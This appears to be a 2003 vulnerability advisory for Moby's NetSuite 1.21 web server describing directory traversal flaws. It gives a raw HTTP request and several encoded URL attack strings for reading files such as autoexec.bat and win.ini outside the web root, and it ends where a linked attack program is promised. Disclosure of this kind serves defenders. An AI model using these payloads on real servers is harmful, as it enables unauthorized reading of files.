Moby's Netsuite 1.21 Traversal Directory bugs


Release Date:
13 July, 2003


Description:
NetSuite is a freeware server suite that allows anyone with a static IP address the ability to run their own mail and web services. Note that you cannot reasonably run a web server from a normal dial-in account. 
   Netsuite is designed for complete simplicity -- requiring only a few minutes to setup with no prior network skills or experience, and requires virtually no memory or processor time. General Windows file management and an understanding of the Internet is required. There are two sections: Moby Mail and Moby Web. Both are very direct to install and use, requiring only few minutes to begin using. Full source code for Microsoft Visual C++ 6.0 is available on the web. 

There exists some directory traversal vulnerabilities that allow someone to download or read
files outside the web folder. In order for this attack to work we have to use some HTML characters instead  of  normal one.


The attack:

GET / HTTP/1.1
Host: /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cautoexec.bat

In our example above we want to see the file autoexec.bat.
***The folder /error/ doesn't exist in my Pc:P ehhe

Other attack strings: http://127.0.0.1/%5c..%5c..%5c..%5cwindows%5cwin.ini
http://127.0.0.1/%5c..%5c..%5c..%5cwindows%5cwin%2eini
http://127.0.0.1/\..\..\..\windows\win.ini
While i was searching i found about 25 attack string.This is only a small sample above.


The Attack Program:
I have created a sample attack program for Moby's Netsuite 1.21(possibly it for all versions of Moby's Netsuite ). You can get it from here:
